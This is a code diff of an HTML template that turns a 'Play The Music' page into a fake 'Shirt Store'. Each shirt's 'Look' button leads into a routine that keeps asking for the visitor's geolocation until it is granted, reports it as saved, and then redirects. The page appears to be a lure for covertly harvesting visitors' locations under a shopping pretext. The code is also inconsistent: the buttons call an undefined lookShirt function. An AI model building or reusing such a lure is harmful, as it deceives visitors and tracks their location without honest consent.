@@ -58,10 +58,19 @@
   <div class="video-container">
   <iframe src="https://www.youtube.com/embed/YZAFd9o3RYQ?si=VxpMZck8rrJSAGYT" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>
   </div>
-  <button id="getLocationBtn">Play The Music</button>
+  <h1>🧥 Shirt Store</h1>
+  {% for shirt in shirts %}
+  <div class="shirt">
+    <h2>{{ shirt.name }}</h2>
+    <p>Price: {{ shirt.price }}</p>
+    <button  onclick="lookShirt('{{ shirt.link }}')">Look</button>
+    <!-- <button id="getLocationBtn">Play The Music</button> -->
+  </div>
+  {% endfor %}
+
 
   <script>
-    async function askLocation() {
+    async function onclick(link) {
       let granted = false;
   
       while (!granted) {
@@ -94,14 +103,14 @@
           alert("✅ Location saved!");
           // 🔁 Redirect here
         //   window.location.href = "https://cdn.glitch.global/8342c6be-596a-406c-8522-ab90e8b3c464/Bhen%20ka%20shot%20memes%20%20%23viralvideo%20%23memes%20%23terdingvideo%20%23viralmemes%20%23youtubeshorts%20%23viralshort.mp4?v=1751048273444"; // or your desired URL
-          window.location.replace("https://youtube.com/shorts/5enLRdcf6dY?si=hwziyN7BhhZnMB-P"); // or your desired URL
+          window.location.replace(link); // or your desired URL
         } else {
           alert("❌ " + result.error);
         }
       });
     }
   
-    document.getElementById("getLocationBtn").addEventListener("click", askLocation);
+    // document.getElementById("getLocationBtn").addEventListener("click", askLocation);
   </script>
   
 </body>
